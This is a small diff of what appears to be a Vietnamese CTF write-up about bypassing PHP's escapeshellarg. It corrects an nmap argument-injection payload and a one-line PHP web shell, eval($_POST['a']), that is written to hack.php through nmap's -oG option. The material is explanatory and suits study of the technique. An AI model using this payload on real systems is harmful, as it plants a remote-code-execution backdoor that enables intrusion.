@@ -36,7 +36,7 @@ Mình có đọc [wu](https://security.szurek.pl/en/exploit-bypass-php-escapeshe
 
 `nmap -T5 -sT -Pn --host-timeout 2 -F`
 
-Payload: `nmap -T5 -sT -Pn --host-timeout 2 -F '1'\\shellcode\'`
+Payload: `nmap -T5 -sT -Pn --host-timeout 2 -F '1'\\''shellcode\'`
 
-shellcode: `'<?php eval($_POST[a]);?> -oG hack.php '`
+shellcode: `'<?php eval($_POST["a"]);?> -oG hack.php '`
 
